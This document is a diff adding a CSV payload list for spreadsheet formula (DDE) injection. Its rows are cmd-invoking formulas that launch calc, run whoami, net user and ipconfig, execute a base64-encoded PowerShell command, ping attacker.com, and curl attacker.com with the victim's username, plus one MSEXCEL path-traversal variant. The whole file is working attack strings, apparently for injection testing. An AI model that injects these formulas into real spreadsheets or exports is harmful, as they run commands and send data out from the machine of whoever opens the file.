@@ -1,0 +1,9 @@
+Payload,Description
+=cmd|'/C calc'!A0,DDE calc
+=cmd|'/C whoami > C:\out.txt'!A0,DDE whoami to file
+=cmd|'/C powershell -enc JABjAG0AZAAgAC8AYwAgAGMAbwBwAHkAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBhAGwAYwAuAGUAeABlACAAQwA6AFwAdABlAG0AcAAuAGUAeABl'!A0,DDE powershell base64
+=cmd|'/C net user'!A0,DDE net user
+=cmd|'/C ipconfig'!A0,DDE ipconfig
+=cmd|'/C ping attacker.com'!A0,DDE ping OOB
+=cmd|'/C curl http://attacker.com/?x=%username%'!A0,DDE curl exfil
+=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc'!'',DDE path traversal
